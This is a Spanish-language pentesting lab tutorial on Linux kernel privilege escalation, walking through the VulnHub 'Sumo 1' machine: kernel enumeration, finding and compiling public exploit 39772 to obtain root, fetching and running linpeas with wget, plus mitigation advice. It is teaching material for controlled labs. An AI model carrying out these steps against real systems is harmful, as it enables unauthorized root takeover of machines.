
---

# Laboratorio: Explotación del Kernel en Linux

---

## ¿Qué es el Kernel?

> El *kernel* es el núcleo del sistema operativo. Se encarga de gestionar directamente los recursos del sistema:

- Memoria
- Procesos
- Archivos y sistemas de archivos
- Comunicación con dispositivos (drivers)

Dado que opera con los máximos privilegios posibles, cualquier vulnerabilidad en el kernel representa un riesgo **crítico** de seguridad: un atacante que logre explotarla puede conseguir acceso como `root`, comprometiendo totalmente el sistema.

---

## ¿Qué es la escalada de privilegios mediante explotación de kernel?

> La *escalada de privilegios* es la técnica mediante la cual un atacante, con acceso limitado (por ejemplo, como usuario normal), consigue elevar sus privilegios hasta convertirse en superusuario (`root`), aprovechando una vulnerabilidad del sistema.

Cuando esta técnica se basa en una **vulnerabilidad del kernel**, el atacante interactúa con un componente del núcleo (syscalls, módulos, drivers, etc.) de forma maliciosa para ejecutar código arbitrario con privilegios elevados.

---

## Tipos comunes de vulnerabilidades de kernel

| Tipo de vulnerabilidad        | Descripción breve                                                |
|------------------------------|------------------------------------------------------------------|
| Buffer overflow               | Escritura fuera de los límites de un búfer en espacio del kernel |
| Use-after-free               | Acceso a memoria ya liberada → control arbitrario de punteros    |
| Null pointer dereference     | Lectura/escritura en dirección `0x0` → ejecución controlada       |
| Race conditions               | Condiciones de carrera entre procesos para explotar sincronización|
| Privilege escalation en syscalls | Fallos en llamadas al sistema que no validan permisos correctamente |

---

## Detección de versión vulnerable

Antes de explotar una vulnerabilidad de kernel, hay que verificar:

```bash
uname -a
````

Ejemplo:

```bash
Linux victim 4.4.0-21-generic #37-Ubuntu SMP x86_64 GNU/Linux
```

### Acción:

Consultar en bases de datos de exploits conocidos (como `exploit-db`) si esa versión tiene vulnerabilidades públicas:

```bash
searchsploit linux kernel 4.4
```

---

## Ejemplo práctico: Explotación en la máquina _Sumo 1_ (VulnHub)

**Recurso de práctica**:  
-  [https://www.vulnhub.com/entry/sumo-1,480/](https://www.vulnhub.com/entry/sumo-1,480/)

Esta máquina vulnerable contiene un kernel antiguo con una vulnerabilidad pública que permite escalar privilegios.

### Paso 1: Enumeración de kernel

```bash
uname -a
```

Resultado:

```
Linux sumo 4.4.0-21-generic #37-Ubuntu SMP...
```

### Paso 2: Identificar exploit compatible

Buscar exploit compatible:

```bash
searchsploit 4.4.0-21
```

Resultado ejemplo:

```
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' Privilege Escalation
```

Descargar el exploit:

```bash
searchsploit -m 39772
```

Compilar en la máquina víctima (si se puede):

```bash
gcc 39772.c -o rootme
./rootme
```

### Resultado esperado:

```bash
# whoami
root
```

Ya tienes acceso completo como superusuario gracias a una vulnerabilidad del kernel.

---

## Mitigaciones y buenas prácticas

- **Actualizar el kernel** frecuentemente.
    
- **Aplicar parches de seguridad** apenas estén disponibles.
    
- **Usar mecanismos de protección adicionales** como:
    
    - `grsecurity`
        
    - `AppArmor` / `SELinux`
        
    - `kernel lockdown` (modo seguro del kernel)
        
- **Recompilar el kernel** sin módulos innecesarios ni soporte a arquitecturas inseguras.
    
- **Eliminar compiladores o herramientas de desarrollo** de entornos productivos para dificultar la explotación directa.
    

---

## Herramientas útiles

|Herramienta|Propósito|
|---|---|
|`uname -a`|Ver versión del kernel|
|`searchsploit`|Buscar exploits públicos conocidos|
|`exploit-db`|Base de datos de vulnerabilidades|
|`linpeas`|Detecta versiones de kernel vulnerables|
|`lse`|Enumera configuraciones débiles del sistema|
|`checksec`|Verifica protecciones del sistema/binarios|

---

## Bonus: Automatización de la detección

Usar `linpeas` para detectar automáticamente si el kernel es vulnerable:

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Salida típica:

```
[+] Kernel version: 4.4.0-21-generic
[+] Possible kernel exploits:
   - Dirty Cow
   - OverlayFS
   - Bad Blue
```

---

## Conclusión

La explotación del kernel es una de las técnicas más poderosas en pentesting y Red Team cuando se trata de escalada de privilegios. Por ello, es fundamental:

-  Saber detectar versiones vulnerables  
-  Verificar la existencia de exploits públicos  
-  Configurar laboratorios controlados para pruebas  
-  Automatizar las auditorías de seguridad internas

**Nunca pruebes esto en entornos de producción sin autorización.**

---

